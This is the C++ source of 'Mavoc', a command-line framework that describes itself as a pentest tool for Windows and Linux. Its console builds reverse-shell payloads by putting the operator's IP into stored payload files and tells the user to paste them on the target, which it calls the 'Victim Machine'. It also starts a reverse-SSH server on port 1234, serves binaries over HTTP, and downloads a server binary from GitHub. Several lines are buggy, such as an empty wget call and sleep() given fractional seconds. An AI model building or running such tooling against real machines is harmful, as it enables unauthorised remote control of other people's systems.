#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <algorithm>
#include <filesystem>
#include <curl/curl.h>

// For Network Operations. 

#include <sys/ioctl.h>
#include <linux/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

// For cool Color Codes

#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"


using namespace std;

void shell();
void end_banner();
void mavoc_banner(){

string multi;
    
  /*  multi = R"(    
███╗░░░███╗░█████╗░██╗░░░██╗░█████╗░░█████╗░
████╗░████║██╔══██╗██║░░░██║██╔══██╗██╔══██╗
██╔████╔██║███████║╚██╗░██╔╝██║░░██║██║░░╚═╝
██║╚██╔╝██║██╔══██║░╚████╔╝░██║░░██║██║░░██╗
██║░╚═╝░██║██║░░██║░░╚██╔╝░░╚█████╔╝╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░ 
                                   Unleashed
    )"; */
    multi = R"(
┳┳┓         ┏┓┏┓┓┏
┃┃┃┏┓┓┏┏┓┏  ┗┓┗┓┣┫
┛ ┗┗┻┗┛┗┛┗  ┗┛┗┛┛┗
                  
    )";
    cout << multi;
}

void mavoc_mini_banner(){
    string multi1 = R"(
┳┳┓      ┏┓  ┏┓                ┓┏┓
┃┃┃┏┓┓┏┏┓┃   ┣ ┏┓┏┓┏┳┓┏┓┓┏┏┏┓┏┓┃┫ 
┛ ┗┗┻┗┛┗┛┗┛  ┻ ┛ ┗┻┛┗┗┗ ┗┻┛┗┛┛ ┛┗┛ . 
     )"; 

    cout << multi1 << endl;
}

void update_repo(){
    cout << "Updating Repos Please wait"<< endl;
    system("sudo apt update");
    cout << "Installing dependencies ..." << endl;
    system("sudo apt install xterm unzip -y");
    system("wget ");
    cout << "Installation Completed" << endl;

}


/*Variable for Downloading Files*/
size_t callback(void* contents, size_t size, size_t nmemb, void* userp) {
    FILE* file = (FILE*)userp;
    return fwrite(contents, size, nmemb, file);
}

string getLocalIpAddress() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        cerr << "Error creating socket" << endl;
        return "";
    }

    const char* googleDns = "8.8.8.8";
    unsigned short dnsPort = 53;

    sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(dnsPort);
    inet_pton(AF_INET, googleDns, &serverAddr.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        cerr << "Error connecting to Google DNS" << endl;
        close(sockfd);
        return "";
    }

    sockaddr_in localAddr;
    socklen_t addrLen = sizeof(localAddr);
    if (getsockname(sockfd, (struct sockaddr*)&localAddr, &addrLen) < 0) {
        cerr << "Error getting local IP address" << endl;
        close(sockfd);
        return "";
    }

    char localIp[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(localAddr.sin_addr), localIp, INET_ADDRSTRLEN);
    close(sockfd);


    return string(localIp);
}


// Payload Parsing 

void windows_payload(string& local_ip_address, string& local_ip_port) {

    string ip_addr_port = local_ip_address;

    ifstream inputFile("files/windows-psw-payload");
    if (!inputFile.is_open()) {
        cerr << "Failed to open the input file." << endl;
    }

    string content((istreambuf_iterator<char>(inputFile)),
                        istreambuf_iterator<char>());

    inputFile.close();

    string targetWord = "0.0.0.0";
    string replacementWord = ip_addr_port;

    size_t pos = content.find(targetWord);
    while (pos != string::npos) {
        content.replace(pos, targetWord.length(), replacementWord);
        pos = content.find(targetWord, pos + replacementWord.length());
    }

    cout << content << endl;

}

void linux_payload(string& local_ip_address, string& local_ip_port){

    string ip_addr_port = local_ip_address;
    ifstream inputFile1("files/linux-bash-payload");
    if(!inputFile1.is_open()){
        cerr << "Failed to adter the payload " << endl;
    }

    string content((istreambuf_iterator<char>(inputFile1)),
                        istreambuf_iterator<char>());

    inputFile1.close();

    string targetWord = "0.0.0.0";
    string replacementWord = ip_addr_port;

    size_t pos = content.find(targetWord);
    while (pos != string::npos) {
        content.replace(pos, targetWord.length(), replacementWord);
        pos = content.find(targetWord, pos + replacementWord.length());
    }

    cout << content << endl;

}

// start the python server
void py_server(){
    cout << " Py Server" << endl;
    
    char cwd[FILENAME_MAX];

    if (getcwd(cwd, sizeof(cwd)) != nullptr) {
        const char* pythonCommand = "python3 -m http.server 80 --directory ";
        const char* bin = "/bins";

        char command[FILENAME_MAX + strlen(pythonCommand) + 1];
        sprintf(command, "%s%s%s", pythonCommand, cwd , bin);

        int result = system(command);

        if (result == 0) {
            cout << "HTTP server started successfully." << endl;
        } else {
            cout << "Failed to start HTTP server." << endl;
        }
    } else {
        cerr << "Failed to get current working directory." << endl;
    }
}

// Check if Internet is Avaiable 

bool is_internet_avaiable() {
    int response = system("ping -c 1 google.com > /dev/null 2>&1");
    return (response == 0);
}

void internet_checker(bool isConnected) {
    if (isConnected) {
        cout << "\033[1;32mNetwork Connected.\033[0m" << endl;
    } else {
        cout << "\033[1;31mNetwork is not connected.\033[0m" << endl;
        cout << "\033[1;33mNetwork is required to Deliver Payoad to Victim Machine.\033[0m]" << endl;
    }
}

void download_module(){
    
    const char* url = "https://github.com/Whitecat18/mavoc/raw/main/bin/server";
    
    const char* outputFilePath = "bin/server";

    CURL* curl = curl_easy_init();
    if (curl) {
        FILE* outputFile = fopen(outputFilePath, "wb");
        if (outputFile) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, outputFile);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK)
                cerr << "Error downloading the file: " << curl_easy_strerror(res) << endl;

            fclose(outputFile);
        } else {
            cerr << "Failed to open the output file." << endl;
        }

        curl_easy_cleanup(curl);
    } else {
        cerr << "Failed to initialize download , Please restart the pakages manually" << endl;
    }

    cout << "Downloaded Successfully";
    system("pause");
}

void getCurrentDirectory(char* currentDir, size_t bufferSize) {


    if (getcwd(currentDir, bufferSize) == nullptr) {
        std::cerr << "Error getting current directory." << endl;
    }
}


void setting_up(){
    
    cout << "Setting up Please Wait" << endl;
    /*creating keys and storing it in database*/
    system("ssh-keygen -t rsa -f files/authorized_keys -N """);
    cout << "Configured successfully";
}

/*can be shifted to main branch*/

void psw_server(string& power_ip_addr){
    system(power_ip_addr.c_str());
}

void kill_psw_server(){
    system("/usr/bin/bash ; ser_if=$(pgrep -f server.py); kill $ser_if &");
    cout << YELLOW << "Killed" << RESET << "\n";;
}

void server_st(){
    int infno;
    // Start the server
    string server_c;
    // looting current directory

    const size_t bufferSize = 4096;
    char currentDir[bufferSize];
    getCurrentDirectory(currentDir, bufferSize);

    cout << " Starting Server ..." << endl;
    // system("clear");
    system("chmod +x server/server");
    //string server_st = "gnome-terminal -- /bin/bash -c '" + currentDir + "/bin/server 0.0.0.0:1234 --insecure' &" ;
    system("xterm -e /bin/bash -c 'cd bin ; figlet Server Pannel ; ./server 0.0.0.0:1234 --insecure' & ");
    sleep(0.5);
    system(" ");
    cout << "Server started..\n ";

}

void kill_server(){
    system("pkill xterm");
    cout << "Killed Server" << "\n";
}

void restart_ssh_server(){
    sleep(0.5);
    kill_server();
    server_st();
}


void help(){
    system("cat files/infos/help_ssh");
}

void user();
void sys_commands();
void powershell_commands();

// Main Function

int main(){

    mavoc_mini_banner();
    int select;

    // GEtting Ip Address 
    string local_ip_address;
    cout << CYAN <<  "Enter your Local Ip Address : " << RESET;
    cin  >> local_ip_address;

     // Storing Ip into Address.
    ofstream outFile("ip_addr", ios::out); 

    if (!outFile.is_open()) {
        cerr << "Failed to open the file." << endl;
        return 1;
    }

    outFile << local_ip_address << endl; 
    outFile.close();

    // Asking Framework
    cout << endl << endl; 


    cout << "Welcome to mavoc . The All in one tool to pentest Windows and Linux machines" << endl;
    cout << "What do you want to use to pentest ?" << endl << endl;
    cout << " 1. SSH-Kench \n 2. Python-Exin \n 3. Low-Func C,C++ (Coming Soon) \n 4. Exit \n\n Option : ";
    cin >> select;

    if (select == 1){
        cout << "Using SSH-Kench Method\n" << endl;
        sleep(1);
        system("clear");
    }
    
    else if (select == 2){
        cout << "Using Python-exin" << endl;
        system("clear");
        system("./mavoc-exin");
        //system("tmux send-keys -t mavoc-exin './bin/python-exin/mavoc-exin.py' ");
        system("clear");
        system("./mavoc");
    }

    else if(select == 3){
        cout << "using Low-Func " << endl;
        cout << "\033[1;33mComing Soon..\033[0m" << endl;
        exit(1);
    }

    else if(select == 4){
        exit(1);
    }

    else {
        exit(1);
    }

    cout << endl;
    cout << "\033[1;36mChecking Internet Connection ..\033[0m" << endl;
    bool isConnected = is_internet_avaiable();
    sleep(0.5);
    internet_checker(isConnected);
    

    string folderpath = "bin";
    string filename = "server";
    char y_n;
    

    /*STring Changer for Payload share */
    //string local_ip_address;
    string local_ip_port = "1234";
    string ip_addr_port;


    //local_ip_address = "192.168.1.103";
    //local_ip_port = "1234";

    cout << "Mavoc Framework" << endl;

    //cout << "Enter your Local Ip Port to Perform [ Default Port 1234 ] :";
    //cin  >> local_ip_port;
    // ip_addr_port = local_ip_address + ":" + local_ip_port;
    cout << endl;

    /*Check if all files are installed */
    ifstream fileStream(folderpath + "/" + filename);
    if (fileStream.is_open()) {
        cout << "\033[0;32mAll Programs are Downloaded \033[0m." << endl;
    }
    else {
        cout << "The File does not Exists ! Downloading Files .." << endl;
        download_module();
    }
    
    // powershell bible server 
    cout << YELLOW << "Starting psw-Bible Server" << RESET << endl;
    string power_ip_addr = "python3 server.py " + local_ip_address + " > /dev/null 2>&1 &";
    psw_server(power_ip_addr);
    cout << GREEN << "Psw Server Running" << RESET << endl;
    
    cout << "Do you need to start the main server now ? [ y/n ] : ";
    cin >> y_n;
    
    if (y_n == 'y'){
        server_st();
    }
    else {
        cout << " ";
    }
   
    sleep(0.6);
    system("clear");
    sleep(1);

    mavoc_banner();
    
    string cmd;
    
    // Mavoc Console Starts ...
    cout << endl;
    cout << "[\033[0;36mINFO\033[0m]  " << "Ssh-Kench Server Addressed with "<< GREEN << local_ip_address << RESET << ":" << YELLOW << local_ip_port << RESET << endl;
    cout << "[\033[0;36mINFO\033[0m]  " << "Psw-Bible Server Addressed with "<< GREEN << local_ip_address << RESET << ":" << YELLOW << "80" << RESET << endl;
    cout << "\n";


    while (true){

        cout << "Mavoc > ";
        getline(cin, cmd);

        cmd = regex_replace(cmd, regex("\\s+$"), "");
        //cout << "Mavoc > ";
      //  int cmds = system(cmd.c_str());
    
       // int cmds2 = system(cmd.c_str());
    
    if (cmd.empty()){
        continue;
    }

    /*else if (cmd == "update mavoc"){
        cout << "Do you wish to Update the Mavoc Framework : ";
        cin >> y_n;
        if (y_n == 'y'){
            update_repos2;
        }
    }*/

    else if (cmd == "clear"){
        system("clear");

    }

    else if (cmd == "help"){
        help();
    }
    
    else if (cmd == "start server"){
        //cout << "Started Server" << endl;
        cout << "[\033[0;36mINFO\033[0m]\t" << "ssH-Kench started with "<< GREEN << local_ip_address << RESET << ":" << YELLOW << local_ip_port << RESET << endl;
        server_st();
        
    }
    

    else if (cmd == "kill server"){
        kill_server();
    }
    
    /*else if (cmd == "kill ps server"){
        cout << YELLOW << "Killing ps Server" << RESET;
        kill_psw_server();
    }*/

    // payload series 

    else if (cmd == "generate windows payload"){
        cout << "Generating Logs ans server . " << endl;
     
        sleep(1);
        cout << "--------------"<< endl;
        windows_payload(local_ip_address , local_ip_port);
        cout << "--------------" << endl; 
        cout << endl;
        cout << YELLOW <<"Copy and Paste in the Windows machine" << RESET << endl;
        
    }

    else if (cmd == "start ps server"){
        psw_server(power_ip_addr);
    }
    else if (cmd == "kill shell"){
        system("pkill tmux");
    }

    else if (cmd == "generate linux payload"){
        
        cout << "Generating Linux Link ." << endl;
        sleep(1);
        cout << "-------------" << endl;
        linux_payload(local_ip_address, local_ip_port);
        cout << "-------------" << endl;
        cout << endl;
        cout << GREEN <<"Copy and paste it in the linux machine" << RESET <<endl;
    }

    // connection series for reverse_ssh 
    else if (cmd == "connect server")
    {
        cout << "Connecting to Server ...\n\n" << endl;
        cout << "Do you wish to operate the server from new Terminal . Using here will lose the Functionality of the program. [ y/n ] :";
        cin >> y_n; 

        // code to find the username for the current user
        const char* username = getenv("USER");
        string usernameboi;
        string usernameStr(username);

        
        if (y_n == 'y'){
        // tmux new-session -s shared-session

        //string xterm_connect_command = "gnome-terminal -- bash -c ' tmux new-session -s psqwe; echo Mavoc cnt ;sleep 2 ; ssh " + usernameStr + "@" + local_ip_address + " -p " + local_ip_port + " '";
        string tmux_sr1 = "gnome-terminal -- bash -c 'tmux new-session -s mavoc-shell'";
        string tmux_sr2 = "tmux send-keys -t mavoc-shell 'ssh " + usernameStr + "@" + local_ip_address + " -p " + local_ip_port + "'" + " C-m";
        string tmux_sr3 = " ";
        //string tmux_sr3 = "ssh "+ usernameStr + "@" + local_ip_address + " -p " + local_ip_port + " ";
        //string tmux_sr3 =  tmux_sr1 + " " + tmux_sr2;
        //system(xterm_connect_command.c_str());
        system("bash scroll");
        system(tmux_sr1.c_str());
        sleep(0.65);
        cout << "\033[0;36mConnecting ..."<< CYAN << endl;
        system("bash files/loading");
        system(tmux_sr2.c_str());
        cout << "\033[0;32mConnected .\033[0m" << endl;
        //sysetm(tmux_sr3.c_str());
        }
        else {
            //cout << "Do you wish to start Powershell Bible ? [ y/n ] : ";
            cout << "Running on the same terminal can cause opening Powershell bible (Need to Run Manually) . Do you wish to continue : [ y/n ]";
            cin >> y_n;
            if (y_n == 'n'){
                string tmux_sr1 = "gnome-terminal -- bash -c 'tmux new-session -s mavoc-shell'";
                string tmux_sr2 = "tmux send-keys -t mavoc-shell 'ssh " + usernameStr + "@" + local_ip_address + " -p " + local_ip_port + "'" + " C-m";
                string tmux_sr3 = " ";
                //string tmux_sr3 = "ssh "+ usernameStr + "@" + local_ip_address + " -p " + local_ip_port + " ";
                //string tmux_sr3 =  tmux_sr1 + " " + tmux_sr2;
                //system(xterm_connect_command.c_str());
                system("bash scroll");
                system(tmux_sr1.c_str());
                sleep(0.65);
                cout << YELLOW << "Connecting ..." << CYAN << endl;
                system("bash files/loading");
                system(tmux_sr2.c_str());
                cout << "\033[0;32mConnected .\033[0m" << endl;
            }
            else{
                string tmux_sr1 = "tmux new-session -s mavoc_shell'";
                string tmux_sr2 = "tmux send-keys -t mavoc_shell 'ssh " + usernameStr + "@" + local_ip_address + " -p " + local_ip_port + " " + "C-m'";
                system(tmux_sr1.c_str());
                sleep(0.2);
                system("bash files/loading");
                system(tmux_sr2.c_str());
            }
        
        }

    }
    
    else if (cmd == "generate payload"){
        cout << "type help for more info" << endl;
        cout << "generate windows payload";
        cout << " (or) \n generate linux payload" << endl;
    }

    else if (cmd == "ps bible"){
        
        system("./psw-bible");
    }
    else if (cmd == "exit"){
        cout << "Do you wish to kill the server ? [ y/n ] :";
        cin >> y_n;
        if (y_n == 'y'){
            kill_server();
        }
        end_banner();
        kill_psw_server();
        system("bash fix-mavoc");
        //system("/usr/bin/bash ; ser_if=$(pgrep -f server.py); kill $ser_if &");

        break;
    }
    
    else {
        cout << "\033[0;33mCommand not found . Type help for more info\033[0m" << endl;
    }
    
}
}

/*
void help(){
    cout << "\n" << endl;
    cout << "Mavoc Framework" << endl;
    cout << "An Windows Penetration Testing Framework with Linux integration\n" << endl;
    cout << "| Help Command List | " << endl;
    cout << "COMMANDS    |      COMMAND INFO  " << endl;

    cout << "Start Server -> To start the server" << endl;
    cout << "kill server -> To kill the server " << endl;

    cout << "generate windows payload -> Genetate Windows payload" << endl;
    cout << "generate linux payload -> Generate Linux payload" << endl;
    cout << "connect server -> To connect to the server" << endl;
    cout << "exit -> To Exit the program \n" << endl;
    cout << "For More Info Visit smukx.site" << endl;
    cout << "Beta Version 1.1 " << endl; 
}*/
/*
void user(string& USERNAME, string& usernameboi){
    const char* username = getenv("USER");
    string usernameboi;

    if (username != nullptr){
        string USERNAME(username);
    }
    else {
        cout << "cant find username from system . ENTER it manually";
        cin >> usernameboi;
    }

}
*/
void end_banner(){
    string bat;

    bat = R"(
     ,*-~"`^"*u_                                _u*"^`"~-*,

  p!^       /  jPw                            w9j \        ^!p

w^.._      /      "\_                      _/"     \        _.^w

     *_   /          \_      _    _      _/         \     _* 

       q /           / \q   ( `--` )   p/ \          \   p

       jj5****._    /    ^\_) o  o (_/^    \    _.****6jj

                *_ /      "==) ;; (=="      \ _*

                 `/.w***,   /(    )\   ,***w.\"

                  ^ ilmk ^c/ )    ( \c^      ^

                          'V')_)(_('V'

                              `` ``
                         MavoC FraMEWorK
    )";

    cout << bat;
}
